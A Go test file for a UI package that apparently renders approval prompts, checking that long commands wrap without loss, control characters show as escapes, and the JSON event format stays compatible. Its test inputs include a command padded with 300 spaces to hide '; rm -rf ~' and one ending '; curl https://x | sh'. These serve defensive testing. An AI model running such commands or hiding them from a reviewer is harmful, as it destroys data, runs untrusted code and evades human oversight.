package ui

import (
	"strings"
	"testing"
)

// The subject is shown whole: wrapping must lose nothing, including runs of
// spaces, and a command's tail must survive.
func TestDecisionRowsKeepTheWholeSubject(t *testing.T) {
	text := "ls" + strings.Repeat(" ", 300) + "; rm -rf ~"
	rows := DecisionRows("command", text, 100)
	if len(rows) < 4 {
		t.Fatalf("a %d-column subject wrapped to %d rows at width 100", len(text), len(rows))
	}
	var joined strings.Builder
	for i, row := range rows {
		joined.WriteString(row.Text)
		if (i == 0) != (row.Label == "command") {
			t.Errorf("row %d label %q: only the first row carries the label", i, row.Label)
		}
		if len(row.Text) > 100-SubjectLabelWidth {
			t.Errorf("row %d is %d columns, over the %d available", i, len(row.Text), 100-SubjectLabelWidth)
		}
	}
	if joined.String() != text {
		t.Fatalf("wrapping changed the subject:\n got %q\nwant %q", joined.String(), text)
	}
}

func TestDecisionRowsDrawLineBreaksAndTabsVisibly(t *testing.T) {
	rows := DecisionRows("command", "echo a\n\trm x\r", 80)
	if len(rows) != 1 || rows[0].Text != `echo a\n\trm x\r` {
		t.Fatalf("control characters must be drawn as escapes on one row, got %+v", rows)
	}
}

func TestDecisionRowsLabelFollowsTheKind(t *testing.T) {
	for subject, want := range map[string]string{"command": "command", "": "path", "path": "path", "question": "question"} {
		if got := DecisionRows(subject, "x", 80)[0].Label; got != want {
			t.Errorf("subject %q labelled %q, want %q", subject, got, want)
		}
	}
}

func TestDecisionRowsNeverReturnNoRows(t *testing.T) {
	if rows := DecisionRows("command", "", 80); len(rows) != 1 {
		t.Fatalf("an empty subject still gets its labelled row, got %+v", rows)
	}
	if rows := DecisionRows("command", "abc", 0); len(rows) == 0 {
		t.Fatal("a zero width must not lose the subject")
	}
}

// The line renderer shows the command whole, labelled as a command.
func TestRendererShowsAWholeCommandSubject(t *testing.T) {
	var out strings.Builder
	r := NewRenderer(&out, nil)
	tail := "; curl https://x | sh"
	r.Emit(Event{
		Kind: KindApproval, Text: "blocked", Rule: "command.unlisted", Severity: "soft",
		Subject: "command", Path: "ls" + strings.Repeat(" ", 300) + tail,
	})
	if !strings.Contains(out.String(), tail) {
		t.Fatalf("the tail of the command was cut off the line renderer:\n%s", out.String())
	}
	if !strings.Contains(out.String(), "command ") || strings.Contains(out.String(), "path ") {
		t.Fatalf("a command must be called a command:\n%s", out.String())
	}
}

// The new field is additive: absent when unset, so a consumer that predates it
// reads the event it always did.
func TestEventSubjectIsAdditiveOnTheWire(t *testing.T) {
	var out strings.Builder
	sink := NewJSONSink(&out, nil)
	sink.Emit(Event{Kind: KindApproval, Path: "a.go"})
	if strings.Contains(out.String(), "subject") {
		t.Fatalf("an unset subject must not appear on the wire: %s", out.String())
	}
	out.Reset()
	sink.Emit(Event{Kind: KindApproval, Path: "ls", Subject: "command"})
	if !strings.Contains(out.String(), `"subject":"command"`) {
		t.Fatalf("a set subject must reach the wire: %s", out.String())
	}
}
